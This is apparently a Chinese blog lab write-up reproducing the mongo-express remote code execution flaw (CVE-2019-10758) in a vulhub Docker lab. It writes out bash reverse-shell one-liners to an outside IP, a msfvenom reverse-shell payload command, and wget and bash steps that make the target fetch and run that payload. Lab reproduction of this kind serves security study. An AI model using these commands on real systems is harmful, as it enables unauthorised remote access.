ailx10说：这篇是我2023年9月写的。这篇折腾的是 mongo-express。环境能够登录之后，我本来想直接做连接，结果没有按预期回来，只好拆开：先把脚本下载到临时目录，再单独执行，才看到了后面的效果。这个过程让我把“命令写进去了”和“命令真的执行到了哪一步”分开看了。笔记主要留下登录前提、两步尝试和对应的结果，也提醒自己别被脚本后缀带着走，真正交给解释器的是什么内容，得看实际生成的东西。

---

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明mongo-express 远程代码执行漏洞（CVE-2019-10758）环境搭建成功了

![](/notes-assets/f79189c7ca80c199052b.webp)

反弹shell无效的语句

- `bash -c 'bash -i >& /dev/tcp/174.137.58.6/8888 0>&1'`
- `bash -c $@|bash 0 echo bash -i >&/dev/tcp/174.137.58.6/8888 0>&1`

只能靠文件上传了，先准备好反弹shell文件

```
msfvenom -p cmd/unix/reverse_python LHOST=174.137.58.6 LPORT=8888 -f raw > ailx10.py 
```

![](/notes-assets/0c5c6240de348db26292.webp)

通过BurpSuite构造请求，让靶机主动下载反弹shell文件

```
wget http://174.137.58.6:7777/ailx10.py -O /tmp/shell
```

![](/notes-assets/fc600cab61c8cb7859f3.webp)

再次通过BurpSuite构造请求，让靶机主动执行反弹shell

```
bash /tmp/shell
```

![](/notes-assets/11737bf2cdf46ed79b1e.webp)

见证奇迹的时刻到了，反弹shell成功

![](/notes-assets/43d4f7b04195adc3415e.webp)
